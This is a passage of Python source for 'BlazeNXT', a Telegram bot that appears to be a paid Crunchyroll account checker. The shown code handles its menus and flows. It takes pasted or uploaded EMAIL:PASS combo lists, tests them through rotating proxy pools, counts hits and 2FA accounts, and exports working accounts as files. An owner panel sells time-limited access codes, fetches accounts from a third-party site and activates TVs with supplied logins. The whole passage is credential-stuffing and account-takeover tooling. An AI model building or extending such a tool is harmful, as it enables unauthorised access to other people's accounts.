        "👇 <i>Select an action below</i>"
    )


# ===================== BUTTON MENUS (Bot API 9.4 colored JSON) =====================
# style: "primary" (blue) | "success" (green) | "danger" (red)
# icon_custom_emoji_id: colored custom-emoji icon on the button
# If Telegram rejects either field, we auto-fall back (icons off, then styles off,
# then plain buttons) so the menu can NEVER break.
CUSTOM_EMOJI_ID = "5319302927281177662"  # official Bot API docs example (green check)
_CAPS = {"icon": None, "style": None}  # None = untested, False = rejected, True = ok
# ────────────────── Premium Emoji (BlazeNXT — ULTRA LEGENDRY) ──────────────────
# All unicode emojis are replaced with premium custom-emoji IDs from @fStikBot / @TgEmojis
# Provided by user: ~600 IDs. Mapping below covers every emoji used in BlazeNXT.
# Button icons use icon_custom_emoji_id, message emojis use <tg-emoji> tags.
PREMIUM_EMOJI = {}

def _premium_wrap(text: str) -> str:
    return text
def _premium_wrap_disabled(text: str) -> str:
    """Replace unicode emojis with premium <tg-emoji> tags for HTML (single-pass, no nesting)."""
    if not text or "<tg-emoji" in text:
        return text
    import re as _re
    # Build regex sorted longest first
    try:
        # Use set to avoid duplicate emoji keys causing regex alternation issues
        keys = sorted(set(PREMIUM_EMOJI.keys()), key=len, reverse=True)
        # Escape and join
        pat = _re.compile("|".join(_re.escape(k) for k in keys))
        def _repl(m):
            uni = m.group(0)
            eid = PREMIUM_EMOJI.get(uni)
            if eid:
                return f'<tg-emoji emoji-id="{eid}">{uni}</tg-emoji>'
            return uni
        return pat.sub(_repl, text)
    except Exception:
        # fallback loop (should not happen)
        for uni in sorted(PREMIUM_EMOJI, key=len, reverse=True):
            if uni in text:
                eid = PREMIUM_EMOJI[uni]
                tag = f'<tg-emoji emoji-id="{eid}">{uni}</tg-emoji>'
                text = text.replace(uni, tag)
        return text

def _premium_icon(label: str) -> str | None:
    """Pick best premium icon ID for a button label (first emoji found)."""
    for uni in sorted(PREMIUM_EMOJI, key=len, reverse=True):
        if uni in label:
            return PREMIUM_EMOJI[uni]
    return None

# BlazeNXT ribbon brand
BLAZENXT_RIBBON = f'<tg-emoji emoji-id="{PREMIUM_EMOJI["🎀"]}">🎀</tg-emoji>'
BLAZENXT_BRAND = f'<tg-emoji emoji-id="{PREMIUM_EMOJI["🔥"]}">🔥</tg-emoji> <b>BlazeNXT</b> {BLAZENXT_RIBBON}'



def _build_kb(rows) -> InlineKeyboardMarkup:
    """rows: list of rows; each row = list of (label, cb) or (label, cb, style) or (label, cb, style, icon)."""
    use_icon = _CAPS["icon"] is not False
    use_style = _CAPS["style"] is not False
    data = []
    for row in rows or []:
        btns = []
        for item in row:
            label, cb = item[0], item[1]
            style = item[2] if len(item) > 2 else None
            icon = item[3] if len(item) > 3 else None
            kwargs = {}
            if use_icon:
                if icon:
                    kwargs["icon_custom_emoji_id"] = str(icon)
                else:
                    # auto premium icon from label
                    pid = _premium_icon(label) if "_premium_icon" in globals() else None
                    kwargs["icon_custom_emoji_id"] = pid or CUSTOM_EMOJI_ID
            if style and use_style:
                kwargs["style"] = style
            btns.append(InlineKeyboardButton(label, callback_data=cb, **kwargs))
        data.append(btns)
    return InlineKeyboardMarkup(data)


async def _send_menu(msg, text: str, rows, edit: bool) -> bool:
    """Send/edit a message with a button menu. Graceful degradation of 9.4 fields."""
    text = _premium_wrap(text) if "_premium_wrap" in globals() else text
    for _attempt in range(4):
        use_icon = _CAPS["icon"] is not False
        use_style = _CAPS["style"] is not False
        kb = _build_kb(rows)
        try:
            if edit:
                await msg.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            else:
                await msg.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            if use_icon:
                _CAPS["icon"] = True
            if use_style:
                _CAPS["style"] = True
            return True
        except BadRequest as e:
            s = str(e).lower()
            if "message is not modified" in s:
                return True
            if use_icon and ("emoji" in s or "icon" in s):
                _CAPS["icon"] = False
                continue
            if use_style and "style" in s:
                _CAPS["style"] = False
                continue
            logger.warning("menu send failed: %s", e)
            return False
    return False


async def reply_menu(msg, text, rows):
    return await _send_menu(msg, text, rows, edit=False)


async def edit_menu(msg, text, rows):
    return await _send_menu(msg, text, rows, edit=True)


# ===================== REPLY KEYBOARD (Hybrid) =====================
# Hybrid: main menus use ReplyKeyboardMarkup (persistent bottom keyboard),
# sub-menus still use InlineKeyboardMarkup. This matches user choice "hybrid".
def _build_reply_kb(rows, resize=True, one_time=False) -> ReplyKeyboardMarkup:
    """rows: each item can be (label), (label,style), (label,style,icon), (label,style,icon,web_app_url) or dict."""
    use_icon = _CAPS["icon"] is not False
    use_style = _CAPS["style"] is not False
    kb = []
    for row in rows:
        btns = []
        for item in row:
            # parse tuple/list
            label = ""
            style = None
            icon = None
            web_app = None
            if isinstance(item, (list, tuple)):
                label = item[0] if len(item) > 0 else ""
                style = item[1] if len(item) > 1 else None
                icon = item[2] if len(item) > 2 else None
                web_app = item[3] if len(item) > 3 else None
            elif isinstance(item, dict):
                label = item.get("text", "")
                style = item.get("style")
                icon = item.get("icon_custom_emoji_id") or item.get("icon")
                web_app = item.get("web_app") or item.get("web_app_url")
            else:
                label, style = item, None
            kwargs = {}
            # icon: premium mapping fallback
            if use_icon:
                if icon:
                    kwargs["icon_custom_emoji_id"] = str(icon)
                else:
                    pid = _premium_icon(label) if "_premium_icon" in globals() else None
                    kwargs["icon_custom_emoji_id"] = pid or CUSTOM_EMOJI_ID
            if style and use_style and style in ("primary","success","danger"):
                kwargs["style"] = style
            if web_app:
                try:
                    from telegram import WebAppInfo as _WAI
                    if isinstance(web_app, str):
                        kwargs["web_app"] = _WAI(url=web_app)
                    else:
                        kwargs["web_app"] = web_app
                except Exception:
                    pass
            btns.append(KeyboardButton(label, **kwargs))
        kb.append(btns)
    return ReplyKeyboardMarkup(kb, resize_keyboard=resize, one_time_keyboard=one_time)

def main_reply_kb(is_owner: bool) -> ReplyKeyboardMarkup:
    _mini_url = ""
    try:
        _mini_url = _get_miniapp_url() if "_get_miniapp_url" in globals() else ""
    except Exception:
        _mini_url = ""
    # Base rows — last element of Mini App tuple is web_app url (handled by _build_reply_kb)
    rows = [
        [("💎 Check Account", "success"), ("📂 Check File", "primary")],
        [("✅ My Access", "success"), ("📖 How To", "primary")],
        [("🌐 Mini App", "primary", "5447602197439218445", _mini_url if _mini_url else None)],
    ]
    if is_owner:
        rows.append([("👑 Owner Panel", "success")])
    return _build_reply_kb(rows)

def owner_reply_kb() -> ReplyKeyboardMarkup:
    rows = [
        [("🔑 Generate Code", "success")],
        [("📥 Add Proxies", "primary"), ("⚙️ Auto-Check", "primary")],
        [("🌐 Pool Status", "primary"), ("🧹 Clear Pool", "danger")],
        [("📊 Status", "primary"), ("📡 Refresh Proxies", "primary")],
        [("🤖 Oxaam Fetch", "success"), ("📺 TV Activation", "success")],
        [("⬅️ Main Menu", "danger")],
    ]
    return _build_reply_kb(rows)

def gen_reply_kb() -> ReplyKeyboardMarkup:
    rows = [
        [("⏳ 24 Hours", "success"), ("⏳ 48 Hours", "success")],
        [("⏳ 72 Hours", "success")],
        [("⬅️ Back", "danger")],
    ]
    return _build_reply_kb(rows)

# Map reply button text -> callback-like action
REPLY_TEXT_MAP = {
    "💎 Check Account": "check",
    "📂 Check File": "file",
    "🌐 Mini App": "miniapp",
    "🎛 Output Mode": "mode",
    "✅ My Access": "myaccess",
    "📖 How To": "help",
    "👑 Owner Panel": "opanel",
    "🔑 Generate Code": "genpick",
    "📥 Add Proxies": "addpx",
    "⚙️ Auto-Check": "autocheck",
    "🌐 Pool Status": "pool",
    "🧹 Clear Pool": "clearpool",
    "📊 Status": "status",
    "📡 Refresh Proxies": "refresh",
    "🤖 Oxaam Fetch": "oxaam",
    "📺 TV Activation": "tv",
    "⬅️ Main Menu": "menu",
    "⬅️ Back": "opanel",  # from gen panel back to owner
    "⏳ 24 Hours": "gen_24",
    "⏳ 48 Hours": "gen_48",
    "⏳ 72 Hours": "gen_72",
    "🔁 Check Again": "check",
    "⬅️ Main Menu": "menu",
    "🎫 Redeem Access Code": "redeem_flow",
}

async def _send_reply_menu(msg, text: str, reply_kb: ReplyKeyboardMarkup, inline_rows=None):
    """Send text with ReplyKeyboard (colored) + fallback handling"""
    text = _premium_wrap(text) if "_premium_wrap" in globals() else text
    for _attempt in range(4):
        use_icon = _CAPS["icon"] is not False
        use_style = _CAPS["style"] is not False
        try:
            await msg.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_kb)
            return True
        except BadRequest as e:
            s = str(e).lower()
            if use_icon and ("emoji" in s or "icon" in s):
                _CAPS["icon"] = False
                # rebuild without icon
                # For simplicity, rebuild reply_kb without icon by recreating
                # But as we already built kb, we need to rebuild - caller will retry with new _CAPS
                # So just continue to retry; next loop _build_reply_kb will use new caps
                continue
            if use_style and "style" in s:
                _CAPS["style"] = False
                continue
            logger.warning("reply menu send failed: %s", e)
            return False
    return False

async def _edit_or_send_reply(msg, text: str, reply_kb: ReplyKeyboardMarkup):
    # For reply keyboard, we always send new message (can't edit reply keyboard onto old message)
    # So we just send new
    return await _send_reply_menu(msg, text, reply_kb)


# ===================== PENDING INPUT STATE (button -> typed input) =====================
PENDING: Dict[int, dict] = {}
PENDING_LOCK = threading.Lock()


def set_pending(uid: int, kind: str, **kw):
    with PENDING_LOCK:
        PENDING[uid] = {"kind": kind, **kw}


def get_pending(uid: int):
    with PENDING_LOCK:
        return PENDING.get(uid)


def clear_pending(uid: int):
    with PENDING_LOCK:
        PENDING.pop(uid, None)


def _has_access(uid: int) -> bool:
    # access = admin OR has redeem
    return is_admin(uid) or (STORE.has_access(uid)[0] if STORE else False)

def _is_owner(uid: int, username: str = None) -> bool:
    return is_admin(uid, username)


# ===================== MENU DEFINITIONS — BlazeNXT =====================
# Clean Crunchyroll-only menu (no AIO grid) — BlazeNXT
# Keep AIO_SERVICES definition for backward compat but not used in crunchy_only mode
AIO_SERVICES = [
    [("🍥 CRUNCHYROLL", "check", "success")],
]

def menu_main(uid: int):
    if _has_access(uid):
        # BlazeNXT premium welcome header
        try:
            header = welcome_premium_text(uid, str(uid))
        except Exception:
            header = "🔥 <b>BlazeNXT</b> — <i>CRUNCHYROLL CHECKER</i> 🎀\n━━━━━━━━━━━━━━━━━━━━━"
        # Core checker actions only — clean Crunchyroll-only (user chose crunchy_only) — Output Mode removed (fake)
        rows = [
            [("💎 Check Account", "check", "success"), ("📂 Check File", "file", "primary")],
            [("✅ My Access", "myaccess", "success"), ("📖 How To", "help", "primary")],
        ]
        if is_admin(uid):
            rows.append([("👑 Owner Panel", "opanel", "success")])
        return header, rows
    text = (
        "⛔ <b>Access Required</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "This bot is private.\n"
        f"Get a code from the owner: <code>{esc(OWNER_USERNAME)}</code>\n\n"
        "🎫 Press the button below and paste your code.\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🔥 <b>BlazeNXT</b>"
    )
    rows = [[("🎫 Redeem Access Code", "redeem_flow", "success")]]
    return text, rows


def menu_owner():
    ac = bool(STORE.get_setting("auto_check", True)) if STORE else True
    # Premium header already wrapped via _premium_wrap
    # Show live vs custom pool clearly: Pool = custom-added, Live = harvested+custom live
    header = (
        "👑 <b>BlazeNXT — Owner Panel</b> 🎀\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 Proxies: <code>{proxy_count()} live</code> • Pool: <code>{pool_size()} custom</code>\n"
        f"⚙️ Auto-Check: <code>{'ON' if ac else 'OFF'}</code> • 🧵 <code>{THREADS} threads</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━"
    )
    rows = [
        [("🔑 Generate Code", "genpick", "success")],
        [("📥 Add Proxies", "addpx", "primary"),
         (f"⚙️ Auto-Check: {'ON' if ac else 'OFF'}", "autocheck", "primary")],
        [("🌐 Pool Status", "pool", "primary"), ("🧹 Clear Pool", "clearpool", "danger")],
        [("📊 Status", "status", "primary"), ("📡 Refresh Proxies", "refresh", "primary")],
        [("🤖 Oxaam Fetch", "oxaam", "success"), ("📺 TV Activation", "tv", "success")],
        [("⬅️ Back", "menu", "danger")],
    ]
    return header, rows


# ===================== TV / OXAAM WORKERS =====================
def _tv_do(email, pw, code):
    j, st = app_login(email, pw)
    if not j:
        return False, f"login_failed ({st})"
    return activate_tv(j["access_token"], code)


def _oxaam_do():
    # Use proxy for oxaam fetch as well (helps on Railway)
    proxy = get_random_proxy() if "get_random_proxy" in globals() else None
    email, pw = oxaam_fetch(proxy)
    # Fallback: try without proxy if first failed
    if (not email or not pw) and proxy:
        logger.info("Oxaam retry without proxy")
        email, pw = oxaam_fetch(None)
    if not email or not pw:
        return None, None, None
    # Verify the credential via checker (use random proxy for check)
    try:
        r = check_credential({"type": "email", "value": email, "password": pw}, get_random_proxy())
    except Exception as e:
        r = {"st": "err", "data": {"info": str(e)}}
    return email, pw, r


def _oxaam_report(email, pw, res) -> str:
    head = f"🔐 <code>{esc(email)}:{esc(pw)}</code>\n\n"
    if res and res.get("st") == "hit":
        return head + hit_card({"cred": {"type": "email", "value": email, "password": pw},
                                "data": res["data"]})
    st = (res or {}).get("st", "err") if res else "no_cred"
    info = (res or {}).get("data", {}).get("info", "") if res else "oxaam_empty"
    # More user-friendly error
    if st == "no_cred" or not email:
        return (
            "❌ <b>Oxaam Fetch Failed</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ Could not extract from Oxaam.\n"
            "• Site may be slow or blocked — try again in 30s\n"
            "• Try <b>📡 Refresh Proxies</b> then retry\n"
            "• Or use <b>💎 Check Account</b> with your own combos\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔍 Debug: <code>{esc(info) or 'no_html'}</code>\n"
            "🔥 <b>BlazeNXT</b> 🎀"
        )
    return head + f"⚠️ Extracted, but check result: <code>{esc(st)}</code> {esc(info)}\n🔥 <b>BlazeNXT</b> 🎀"


# ===================== HIT CARDS (flood-safe) =====================
async def send_hit_cards(msg, entries: List[dict], cap: int = MAX_HIT_CARDS) -> int:
    sent = 0
    for e in entries[:cap]:
        card = hit_card(e)
        for _ in range(2):
            try:
                await msg.reply_text(card, parse_mode=ParseMode.HTML)
                sent += 1
                await asyncio.sleep(0.4)
                break
            except RetryAfter as fw:  # flood control
                ra = fw.retry_after
                ra = ra.total_seconds() if hasattr(ra, "total_seconds") else float(ra)
                await asyncio.sleep(ra + 0.3)
            except Exception:
                return sent
    return sent


# ===================== CHECK RUNNER — BlazeNXT PREMIUM =====================
async def _run_and_report(msg, uid: int, text: str):
    line_count = max(1, text.count("\n") + 1)
    creds_preview = len(extract_credentials(text))
    # Premium initial card — mimics BlazeNXT "CRUNCHYROLL Scan — Live 0.6%"
    init_card = (
        f"📈 <b>CRUNCHYROLL Scan — Live</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📄 Lines: <code>{line_count}</code> • Combos: <code>{creds_preview}</code>\n"
        f"⏳ Crunchyroll 0% [░░░░░░░░░░░░░░░░░░░░] (0/{creds_preview})\n"
        f"⭐ Hits: <code>0</code> | 🆓 Free: <code>0</code> | 🔐 2FA: <code>0</code> | ❌ Bad: <code>0</code> | ⚠️ Errors: <code>0</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📈 <code>0 cpm</code>  🕒 <code>0m 0s</code>  ⏳ ETA <code>—</code>\n"
        f"📡 <b>Live feed:</b> • <i>starting…</i>"
    )
    note = await msg.reply_text(init_card, parse_mode=ParseMode.HTML)
    loop = asyncio.get_running_loop()
    reporter = ProgressReporter(note, loop)
    try:
        results = await asyncio.to_thread(run_check, text, reporter)
    except Exception as e:
        await note.edit_text(f"❌ <b>Check error</b>\n━━━━━━━━━━━━━━━━━━━━━\n<code>{esc(str(e)[:120])}</code>",
                             parse_mode=ParseMode.HTML)
        return
    bump_checks(results["processed"])
    await note.edit_text(summary_text(results), parse_mode=ParseMode.HTML)

    # exports (sent before the cards so the conversation stays readable)
    premium_only = STORE.get_premium_only(uid)
    to_send = results["hits"] if premium_only else results["hits"] + results["free"]
    if to_send:
        txt_path = make_export(to_send, "txt")
        json_path = make_export(to_send, "json")
        try:
            with open(txt_path, "rb") as f:
                await msg.reply_document(document=InputFile(f, filename="accounts.txt"),
                                         caption=f"💎 Accounts: {len(to_send)}")
            with open(json_path, "rb") as f:
                await msg.reply_document(document=InputFile(f, filename="accounts.json"),
                                         caption="📁 JSON export")
        finally:
            Path(txt_path).unlink(missing_ok=True)
            Path(json_path).unlink(missing_ok=True)

    # ⭐ one detail card per hit (flood-safe, capped)
    if results["hits"]:
        sent = await send_hit_cards(msg, results["hits"])
        extra = len(results["hits"]) - sent
        tail = f"\n<i>…+{extra} more in the export file</i>" if extra > 0 else ""
        rows = [[("🔁 Check Again", "check", "success"), ("📂 Check File", "file", "primary")],
                [("⬅️ Main Menu", "menu", "danger")]]
        await reply_menu(msg, f"📬 <b>Hit cards sent:</b> {sent} {tail}", rows)
    else:
        await reply_menu(msg, "😕 No hits this time.",
                         [[("🔁 Check Again", "check", "success"), ("📂 Check File", "file", "primary")],
                          [("⬅️ Main Menu", "menu", "danger")]])


# ===================== HANDLERS (100% button flow) =====================
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    uid = user.id
    name = getattr(user, "first_name", None) or getattr(user, "username", None) or str(uid)
    if _has_access(uid):
        try:
            text = welcome_premium_text(uid, name)
            is_owner = is_admin(uid, getattr(user, "username", None))
            if is_owner:
                text = "👑 <b>Welcome Owner!</b>\n" + "━━━━━━━━━━━━━━━━━━━━━\n" + text
            # Hybrid: ReplyKeyboard with colors (style + icon) — no inline duplicate
            reply_kb = main_reply_kb(is_owner)
            await msg.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_kb)
            return
        except Exception as e:
            logger.warning("hybrid menu send failed %s", e)
            pass
        except Exception:
            pass
    text, rows = menu_main(uid)
    is_owner = is_admin(uid, getattr(user, "username", None))
    if is_owner:
        text = "👑 <b>Welcome Owner!</b>\n\n" + text
        reply_kb = main_reply_kb(True)
        await msg.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_kb)
    else:
        await reply_menu(msg, text, rows)


async def cmd_any(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Catch-all for any typed /command -> steer the user to the buttons."""
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    text, rows = menu_main(user.id)
    await reply_menu(msg, "🔘 This bot is 100% button-driven — pick an option below 👇\n\n" + text, rows)


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg or not msg.text:
        return
    uid = user.id
    text = msg.text.strip()
    # Hybrid ReplyKeyboard handling: map button text to callback actions
    # Do this BEFORE pending, so Back/Menu buttons work even while pending
    reply_action = REPLY_TEXT_MAP.get(text)
    if reply_action == "miniapp":
        url = _get_miniapp_url() if "_get_miniapp_url" in globals() else ""
        if not url:
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("📖 How To", callback_data="help")]])
            await msg.reply_text(
                "🌐 <b>Mini App</b>\n\n"
                "Mini App URL not configured yet.\n"
                "Set <code>MINI_APP_URL=https://YOUR-APP.up.railway.app</code> in Railway Variables and redeploy.\n"
                "The app is served on <code>PORT</code> from the same service.",
                parse_mode=ParseMode.HTML, reply_markup=kb
            )
            return
        try:
            from telegram import WebAppInfo as _WAI
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("🌐 Open Mini App", web_app=_WAI(url=url))]])
        except Exception:
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("🌐 Open Mini App", url=url)]])
        await msg.reply_text(
            f"🌐 <b>BlazeNXT Mini App</b>\n\nTap to open:\n{url}\n\n"
            "Also available from the Telegram menu button (🌐).",
            parse_mode=ParseMode.HTML, reply_markup=kb
        )
        return
    if reply_action:
        # Clear pending if user pressed a main menu button (acts like on_button)
        # But keep pending for some? For now clear pending and handle as button
        clear_pending(uid)
        # Build a fake callback context for reply actions
        # Reuse on_button logic by constructing minimal handling here
        # Instead of calling on_button, handle directly
        is_owner = is_admin(uid, getattr(user, "username", None))
        # Common reply actions
        if reply_action == "menu":
            try:
                nm = getattr(user, "first_name", None) or str(uid)
                welcome = welcome_premium_text(uid, nm)
                reply_kb = main_reply_kb(is_owner)
                await msg.reply_text(welcome, parse_mode=ParseMode.HTML, reply_markup=reply_kb)
            except Exception:
                mtext, rows = menu_main(uid)
                await reply_menu(msg, mtext, rows)
            return
        elif reply_action == "help":
            await msg.reply_text(help_text(), parse_mode=ParseMode.HTML, reply_markup=main_reply_kb(is_owner) if _has_access(uid) else None)
            return
        elif reply_action in ("check", "file"):
            if not _has_access(uid):
                await reply_menu(msg, access_denied_html(), [[("🎫 Redeem Access Code", "redeem_flow", "success")]])
                return
            if reply_action == "check":
                set_pending(uid, "creds")
                await msg.reply_text(
                    "📝 <b>Check Account</b>\n\nSend me one or more lines in this format:\n<code>EMAIL:PASS</code>\n\nExample: <code>user@gmail.com:mypassword</code>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=_build_reply_kb([["⬅️ Main Menu"]])
                )
            else:
                set_pending(uid, "file")
                await msg.reply_text("📂 <b>Check File</b>\n\nSend me a <code>.txt / .log / .json / .csv</code> file.", parse_mode=ParseMode.HTML, reply_markup=_build_reply_kb([["⬅️ Main Menu"]]))
            return
        elif reply_action == "mode":
            if not _has_access(uid):
                await reply_menu(msg, access_denied_html(), [[("🎫 Redeem Access Code", "redeem_flow", "success")]])
                return
            new = not STORE.get_premium_only(uid)
            STORE.set_premium_only(uid, new)
            await msg.reply_text(f"🎛 Output Mode: <b>{'Premium Only' if new else 'All Working'}</b>", parse_mode=ParseMode.HTML, reply_markup=main_reply_kb(is_owner))
            return
        elif reply_action == "myaccess":
            if is_owner:
                await msg.reply_text("👑 <b>Owner Access</b>\n\nUnlimited.", parse_mode=ParseMode.HTML, reply_markup=main_reply_kb(True))
            else:
                ok, exp = STORE.has_access(uid)
                await msg.reply_text(f"✅ <b>Access Active</b>\n\n⏳ Expires: <code>{fmt_dt(exp)}</code>", parse_mode=ParseMode.HTML, reply_markup=main_reply_kb(False))
            return
        elif reply_action == "redeem_flow":
            set_pending(uid, "redeem")
            await msg.reply_text("🔑 <b>Redeem Code</b>\n\nSend me your access code (plain text).", parse_mode=ParseMode.HTML, reply_markup=_build_reply_kb([["⬅️ Main Menu"]]))
            return
        elif reply_action == "opanel":
            if not is_owner:
                await msg.reply_text("⛔ Owner only.", parse_mode=ParseMode.HTML)
                return
            text, rows = menu_owner()
            # Hybrid: ReplyKeyboard with colors (no inline duplicate)
            await msg.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=owner_reply_kb())
            return
        elif reply_action == "genpick":
            if not is_owner:
                await msg.reply_text("⛔ Owner only.", parse_mode=ParseMode.HTML)
                return
            await msg.reply_text("🔑 <b>Generate Code</b>\n\nPick a duration 👇", parse_mode=ParseMode.HTML, reply_markup=gen_reply_kb())
            return
        elif reply_action in ("gen_24", "gen_48", "gen_72"):
            if not is_owner:
                await msg.reply_text("⛔ Owner only.", parse_mode=ParseMode.HTML)
                return
            hours = int(reply_action.split("_")[1])
            code = generate_code()
            exp = STORE.add_code(code, hours)
            await msg.reply_text(f"✅ <b>Code Generated!</b>\n\n🔑 <code>{code}</code>\n⏳ Valid: <code>{hours}h</code> (until {fmt_dt(exp)})", parse_mode=ParseMode.HTML, reply_markup=owner_reply_kb())
            return
        elif reply_action == "status":
            if not is_owner:
                await msg.reply_text("⛔ Owner only.", parse_mode=ParseMode.HTML)
                return
            await msg.reply_text(status_text(), parse_mode=ParseMode.HTML, reply_markup=owner_reply_kb())
            return
        elif reply_action == "refresh":
            if not is_owner:
                await msg.reply_text("⛔ Owner only.", parse_mode=ParseMode.HTML)
                return
            await msg.reply_text("🔄 <b>Refreshing proxies...</b>\n⏳ Please wait", parse_mode=ParseMode.HTML)
            try:
                await asyncio.to_thread(refresh_live_proxies, True)
                await msg.reply_text(f"✅ <b>Live proxies ready:</b> <code>{proxy_count()}</code>", parse_mode=ParseMode.HTML, reply_markup=owner_reply_kb())
            except Exception as e:
                await msg.reply_text(f"❌ Error: <code>{esc(str(e)[:120])}</code>", parse_mode=ParseMode.HTML)
            return
        elif reply_action == "pool":
            if not is_owner:
                await msg.reply_text("⛔ Owner only.", parse_mode=ParseMode.HTML)
                return
            ac = bool(STORE.get_setting("auto_check", True))
            text = f"🌐 <b>Proxy Pool</b>\n━━━━━━━━━━━━━━━━━━━━━\n📥 Pool (user-added): <code>{pool_size()}</code>\n🌐 Live in use: <code>{proxy_count()}</code>\n⚙️ Auto-Check: <code>{'ON' if ac else 'OFF'}</code>\n🔁 Auto Refresh: <code>{PROXY_REFRESH_MINUTES} min</code>"
            await msg.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=owner_reply_kb())
            return
        elif reply_action == "addpx":
            if not is_owner:
                await msg.reply_text("⛔ Owner only.", parse_mode=ParseMode.HTML)
                return
            set_pending(uid, "addpx")
            await msg.reply_text("📥 <b>Add Proxies</b>\n\nPaste your proxy lines (one per line):\n<code>host:port</code> or <code>user:pass:host:port</code> or full <code>http://…</code> urls.\n\nMax " + str(MAX_PASTED_PROXIES) + " lines.", parse_mode=ParseMode.HTML, reply_markup=_build_reply_kb([["⬅️ Main Menu"]]))
            return
        elif reply_action == "clearpool":
            if not is_owner:
                await msg.reply_text("⛔ Owner only.", parse_mode=ParseMode.HTML)
                return
            await asyncio.to_thread(clear_pool)
            await msg.reply_text("🧹 <b>Pool cleared.</b> Live list reset too.", parse_mode=ParseMode.HTML, reply_markup=owner_reply_kb())
            return
        elif reply_action == "autocheck":
            if not is_owner:
                await msg.reply_text("⛔ Owner only.", parse_mode=ParseMode.HTML)
                return
            new = not bool(STORE.get_setting("auto_check", True))
            STORE.set_setting("auto_check", new)
            await msg.reply_text(f"⚙️ <b>Auto-Check Proxies: {'ON' if new else 'OFF'}</b>", parse_mode=ParseMode.HTML, reply_markup=owner_reply_kb())
            return
        elif reply_action == "oxaam":
            if not is_owner:
                await msg.reply_text("⛔ Owner only.", parse_mode=ParseMode.HTML)
                return
            await msg.reply_text("🤖 <b>Oxaam Fetch</b>\n⏳ Pulling a fresh account...", parse_mode=ParseMode.HTML)
            try:
                email, pw, res = await asyncio.to_thread(_oxaam_do)
            except Exception as e:
                await msg.reply_text(f"❌ Error: <code>{esc(str(e)[:120])}</code>", parse_mode=ParseMode.HTML, reply_markup=owner_reply_kb())
                return
            if not email:
                await msg.reply_text("❌ Could not extract from Oxaam. Try again later.", parse_mode=ParseMode.HTML, reply_markup=owner_reply_kb())
                return
            bump_checks(1 if (res and res["st"] == "hit") else 0)
            await msg.reply_text(_oxaam_report(email, pw, res), parse_mode=ParseMode.HTML, reply_markup=owner_reply_kb())
            return
        elif reply_action == "tv":
            if not is_owner:
                await msg.reply_text("⛔ Owner only.", parse_mode=ParseMode.HTML)
                return
            set_pending(uid, "tv_email")
            await msg.reply_text("📺 <b>TV Activation — Step 1/2</b>\n\nSend me <code>EMAIL:PASS</code> of the account.", parse_mode=ParseMode.HTML, reply_markup=_build_reply_kb([["⬅️ Main Menu"]]))
            return
        # fallback: if we handled, return already
        # if not handled, fall through to normal pending logic
    pending = get_pending(uid)

    # ---------- active input flows (started by a button) ----------
    if pending:
        kind = pending["kind"]

        if kind == "redeem":
            clear_pending(uid)
            if not text:
                return
            res = await asyncio.to_thread(STORE.redeem, text, uid)
            if res in ("invalid", "used", "expired"):
                label = {
                    "invalid": "❌ Invalid code.",
                    "used": "❌ This code has already been used.",
                    "expired": "❌ This code has expired.",
                }[res]
                await reply_menu(msg, label,
                                 [[("🎫 Try Another", "redeem_flow", "success"),
                                   ("⬅️ Menu", "menu", "danger")]])
            else:
                await reply_menu(msg,
                    "🎉 <b>Congratulations!</b>\n\n"
                    "You got access to the <b>Premium Checker</b>\n"
                    f"⏳ Expires: <code>{fmt_dt(res)}</code>",
                    [[("💎 Check Account", "check", "primary"), ("📂 Check File", "file", "primary")],
                     [("⬅️ Menu", "menu", "danger")]])
            return

        if kind == "creds":
            clear_pending(uid)
            creds = extract_credentials(text)
            if not creds:
                await reply_menu(msg,
                    "❌ I couldn't find any credentials there.\n"
                    "Format: <code>EMAIL:PASS</code>",
                    [[("🔁 Try Again", "check", "success"), ("⬅️ Menu", "menu", "danger")]])
                return
            if len(creds) > MAX_PASTED_CREDS:
                await reply_menu(msg,
                    f"❌ Too many lines (max {MAX_PASTED_CREDS}). Send a file instead.",
                    [[("📂 Check File", "file", "primary"), ("⬅️ Menu", "menu", "danger")]])
                return
            await _run_and_report(msg, uid, text)
            return

        if kind == "addpx":
            clear_pending(uid)
            lines = [l for l in text.splitlines() if l.strip()]
            if not lines:
                return
            if len(lines) > MAX_PASTED_PROXIES:
                await reply_menu(msg, f"❌ Too many lines (max {MAX_PASTED_PROXIES}).",
                                 [[("📥 Try Again", "addpx", "primary"),
                                   ("⬅️ Back", "opanel", "danger")]])
                return
            ac = bool(STORE.get_setting("auto_check", True))
            added, invalid = await asyncio.to_thread(add_proxies_to_pool, lines, ac)
            status = "🔎 Auto-check started in background..." if ac else "Added (untested)."
            await reply_menu(
                msg,
                f"📥 <b>Proxy Pool Updated</b>\n\n"
                f"➕ Added: <code>{added}</code> | ⚠️ Invalid: <code>{invalid}</code> | "
                f"🌐 Pool total: <code>{pool_size()}</code>\n\n{status}",
                [[("🌐 Pool Status", "pool", "primary"), ("⬅️ Back", "opanel", "danger")]],
            )
            return

        if kind == "tv_email":
            m = EMAIL_PASS_RE.search(text)
            if not m:
                await reply_menu(msg, "❌ That doesn't look like <code>EMAIL:PASS</code>.",
